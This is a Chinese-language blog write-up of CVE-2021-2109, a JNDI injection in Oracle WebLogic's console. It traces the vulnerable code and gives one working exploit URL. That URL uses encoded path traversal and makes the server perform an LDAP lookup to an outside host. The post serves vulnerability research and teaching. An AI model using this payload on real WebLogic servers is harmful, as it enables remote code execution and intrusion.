# CVE-2021-2109 WebLogic-JNDI注入

  
  
&lt;!--more--&gt;  
## 0x01 环境搭建  
https://www.penson.top/article/av40  
手动添加  
`\server\lib\consoleapp\webapp\WEB-INF\lib\console.jar` 到依赖里面  
## 0x02 漏洞分析与复现  
`Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。`  
拥有访问`/console/consolejndi.portal`页面的用户权限，或者存在`CVE-2020-14883`未授权访问漏洞。  
### 漏洞原理  
`Weblogic`的`/console/consolejndi.portal`接口可以调用存在JNDI注入漏洞的`com.bea.console.handles.JndiBindingHandle`类，从而造成`RCE`  
### 漏洞复现  
payload如下  
```  
http://127.0.0.1:7001/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://10.216.7;79:1389/k4gmvl;AdminServer%22)  
```  
本地启动一个服务  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041500659.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041500409.png)
### 漏洞分析  
根据`payload`分析，先从`consolejndi.portal`开启看起，`.portal`文件就类似于一个`servlet`，在`consolejndi.portal`中存在`JNDI Binding`操作的处理容器，如图  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041527096.png)
具体的处理逻辑在`PortalConfig/jndi/jndibinding.portlet`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041528168.png)
在`com.bea.console.actions.jndi.JNDIBindingActioncom.bea.console.actions.jndi.JNDIBindingAction`类中，发现存在`execute`方法，存在JNDI注入漏洞  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041530621.png)
观察需要如何构造恶意payload，c是由`ConsoleUtils.initNamingContext(serverMBean);`赋值，而`serverMBean`是通过`domainMBean.lookupServer(serverName);`赋值，其中一系列关系如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041531738.png)
先是强转了一个JndiBindHandle类，这里面`getHandleContext()`的逻辑并不复杂，最终会调用`JndiBindingHandle`的构造函数。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041626033.png)
如图，我们在paylad当中的一段被放进了构造函数的`type`和`objectIdentifier`中，而`&#34;ldapxxxx&#34;`这一段会被放在`components`中，由分号分隔  
`JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&#34;ldap://10.216.7;79:1389/k4gmvl;AdminServer&#34;)`  
继续往下看，想要进入JNDI注入的那一段代码，需要满足两个条件，一个是`serverMBean != null`，另一个是`c != null`，进到`serverMBean`看一下代码逻辑  
- `lookupServer` 是 `DommainMBean` 接口的方法，我们去看它的实现类  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041632731.png)
实际上这里是动态代理类调用的，会自动跟进到`weblogic.management.jmx.MBeanServerInvocationHandler#invoke`下，其中`method`的值为`weblogic.management.configuration.DomainMBean#lookupServer`，他的`method`代码逻辑在实现类当中，也就是`weblogic.management.configuration.DomainMBeanImpl#lookupServer`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041633029.png)
走到do while的逻辑里面，返回var3，而不是返回null  
通过调试得到`var2`的值为`AdminServer`，这里没有其他值了，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041639459.png)
所以要求我们此处输入的`var1`与`AdminServer`相同，回去看`var1`是什么，`var1`其实是`serverName`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041642002.png)
发现`serverName`也是可控的  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041642585.png)
现在 `serverBean != null` 没问题，就要看 JNDI lookup 的地址是否可控。  
很明显JNDI lookup的地址也是可控的  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041644847.png)
进入到`JndiBindingHandle`类看一下，`set/getComponents()`的逻辑，先调用了`HandleImpl#getComponent`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041645451.png)
跟进  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409041646662.png)
主要逻辑就是以`;`分隔，就可控`context`与`binding`，就可以进行JNDI注入  
1、`;`号隔开JNDI地址  
2、serverName必须为`AdminServer`  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/cve-2021-2109-weblogic-jndi-%E6%B3%A8%E5%85%A5/  

